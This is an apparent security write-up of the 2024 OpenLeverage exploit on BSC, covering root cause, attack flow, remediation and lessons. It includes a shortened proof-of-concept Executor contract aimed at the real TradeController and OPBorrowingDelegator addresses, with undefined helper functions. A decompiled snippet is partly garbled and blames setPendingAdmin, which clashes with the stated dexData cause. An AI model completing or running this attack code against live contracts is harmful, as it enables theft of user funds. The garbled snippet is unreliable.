# OpenLeverage2 — marginTrade Arbitrary DEX Data Injection Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | OpenLeverage |
| **Chain** | BSC |
| **Loss** | ~$234,000 |
| **Attacker** | [0x5bb5b6d4](https://bscscan.com/address/0x5bb5b6d41c3e5e41d9b9ed33d12f1537a1293d5f) |
| **Vulnerable Contract 1** | [OPBorrowingDelegator 0xF436F8FE](https://bscscan.com/address/0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47) |
| **Vulnerable Contract 2** | [TradeController 0x6A75aC4b](https://bscscan.com/address/0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4) |
| **OLE Token** | [0xB7E2713C](https://bscscan.com/address/0xB7E2713CF55cf4b469B5a8421Ae6Fc0ED18F1467) |
| **Root Cause** | The `marginTrade()` function executes DEX routing data (`dexData`) without validation, allowing the attacker to manipulate positions via crafted DEX data, then realize additional profit through a liquidation callback after price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/OpenLeverage2_exp.sol) |

---

## 1. Vulnerability Overview

OpenLeverage's `marginTrade()` function accepts a `dexData` parameter to specify the swap route and executes it without sufficient validation. The attacker deployed a custom Executor contract, created an xOLE governance lock, and opened a leveraged position. By using manipulated `dexData` and a price manipulation callback, the attacker realized excessive profit upon position liquidation and drained funds across two transactions.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: marginTrade dexData without validation
interface ITradeController {
    function marginTrade(
        uint16 marketId,
        bool longToken,
        bool depositToken,
        uint256 deposit,
        uint256 borrow,
        uint256 minBuyAmount,
        bytes memory dexData  // ← arbitrary DEX routing data
    ) external payable returns (uint256 depositReturn, uint256 tradeReturn);
}

// dexData contents:
// - DEX type (Uniswap V2/V3, PancakeSwap, etc.)
// - Swap path
// - Slippage parameters
// ← Attacker can specify any DEX/path favorable to themselves

// ✅ Safe code: DEX whitelist + data validation
function marginTrade(..., bytes memory dexData) external {
    (uint8 dexType, address[] memory path) = decodeDexData(dexData);
    require(approvedDexTypes[dexType], "dex not approved");
    require(isValidPath(path, holdToken, borrowToken), "invalid path");
    // ...
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: OpenLeverage2_decompiled.sol
contract OpenLeverage2 {
contract OpenLeverage2 {
    address public owner;


    // Selector: 0x4dd18bf5
    function setPendingAdmin(address p0) external {}  // ❌ Vulnerability

    // Selector: 0x5c60da1b
    function implementation() external {}

    // Selector: 0xca4b208b
    function developer() external {}

    // Selector: 0xd784d426
    // Alternative: superSafeFunction96508587(address)
    function setImplementation(address p0) external {}

    // Selector: 0xf851a440
    function admin() external {}

    // Selector: 0x0933c1ed
    function delegateToImplementation(bytes memory p0) external {}

    // Selector: 0x0e18b681
    function acceptAdmin() external {}

    // Selector: 0x26782247
    function pendingAdmin() external view returns (uint256) {}

    // Selector: 0x4487152f
    function delegateToViewImplementation(bytes memory p0) external {}

    // Selector: 0x4e487b71
    function Panic(uint256 p0) external {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (Executor Contract)
  │
  ├─→ [TX 1]
  │   ├─ Create LP tokens + Create xOLE governance lock
  │   ├─ marginTrade(manipulated dexData) execution
  │   │   └─ Open price-manipulated position
  │   └─ liquidate() call → additional profit via callback
  │
  ├─→ [TX 2]
  │   ├─ payoffTrade() execution
  │   └─ Withdraw remaining profit
  │
  └─→ ~$234K drained
```

## 4. PoC Code (Core Logic + English Comments)

```solidity
interface ITradeController {
    function marginTrade(
        uint16 marketId, bool longToken, bool depositToken,
        uint256 deposit, uint256 borrow, uint256 minBuyAmount,
        bytes memory dexData
    ) external payable returns (uint256, uint256);

    function payoffTrade(uint16 marketId, bool longToken) external returns (uint256);
}

interface IOPBorrowingDelegator {
    function borrow(uint16 marketId, bool collateralIndex, uint256 collateral, uint256 borrowing) external;
    function liquidate(uint16 marketId, bool collateralIndex, address borrower) external;
}

interface IxOLE {
    function create_lock(uint256 value, uint256 unlockTime) external;
}

contract Executor {
    ITradeController     constant tc  = ITradeController(0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4);
    IOPBorrowingDelegator constant ob = IOPBorrowingDelegator(0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47);
    IxOLE constant xole = IxOLE(/* xOLE */);

    function attack1() external {
        // [1] Create LP + xOLE lock
        uint256 lpAmount = createLP();
        xole.create_lock(lpAmount, block.timestamp + 1 weeks);

        // [2] marginTrade with manipulated dexData
        bytes memory dexData = encodeMaliciousDexData();
        tc.marginTrade(0, true, true, 1e18, 100e18, 0, dexData);

        // [3] Additional profit via liquidate callback
        ob.liquidate(0, true, address(this));
    }

    function attack2() external {
        // [4] Close position + recover remaining profit
        tc.payoffTrade(0, true);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary DEX Data Injection + Price Manipulation |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (marginTrade dexData forgery) |
| **DApp Category** | Leveraged Trading Protocol |
| **Impact** | Fund drainage via leveraged position manipulation (~$234K) |

## 6. Remediation Recommendations

1. **DEX Whitelist**: Allow only approved DEX types and paths
2. **dexData Structure Validation**: Verify that the swap path matches the token pair of the corresponding market
3. **Liquidation Callback Protection**: Block external callback reentrancy when a liquidation is triggered
4. **Position Price Oracle**: Evaluate positions using TWAP-based prices to neutralize spot price manipulation

## 7. Lessons Learned

- In leveraged protocols, allowing users to directly specify DEX routing data creates a vector for price manipulation attacks.
- Complex DeFi protocols (margin trading, liquidation) can develop vulnerabilities through composition even when each individual function is independently secure.
- Price evaluation for leveraged positions must rely on a manipulation-resistant TWAP oracle.